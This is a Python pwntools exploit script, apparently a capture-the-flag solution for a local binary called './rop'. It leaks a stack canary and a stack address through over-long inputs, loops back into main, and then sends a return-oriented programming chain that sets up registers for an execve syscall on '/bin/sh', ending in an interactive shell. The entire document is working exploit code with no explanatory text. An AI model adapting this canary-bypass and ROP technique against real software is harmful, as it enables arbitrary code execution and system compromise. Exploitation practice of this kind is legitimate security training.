#!/usr/bin/env python3
from pwn import *
context.arch = 'amd64'

p = process('./rop')
# p = remote('localhost', 5566)

main = 0x401ddc

pop_rdi     = 0x4018ca
pop_rsi_r15 = 0x4018c8
pop_rdx     = 0x4017cf
pop_rax     = 0x449607
syscall     = 0x4012d3

payload = b'a' * 11
p.sendafter(b'?', payload)

p.recvuntil(payload)
canary = p.recv(7)

rbp = 0
payload  = b'a' * 10 
payload += b'\0' + canary
payload += p64(rbp)
payload += p64(main)
p.sendafter(b'YOU?', payload)

payload = b'b' * 42
p.sendafter(b'?', payload)

p.recvuntil(payload)
stack = u64(p.recv(6).ljust(8, b'\0'))

log.info(hex(stack))

raw_input('>')

rop_chain = flat(
    pop_rsi_r15,
    0,
    0,
    pop_rdx,
    0,
    pop_rdi,
    stack - 216,
    pop_rax,
    59,
    syscall
)

rbp = 0
payload  = b'a' * 10 
payload += b'\0' + canary
payload += p64(rbp)
payload += rop_chain
payload += b'/bin/sh\0'
p.sendafter(b'YOU?', payload)

p.interactive()
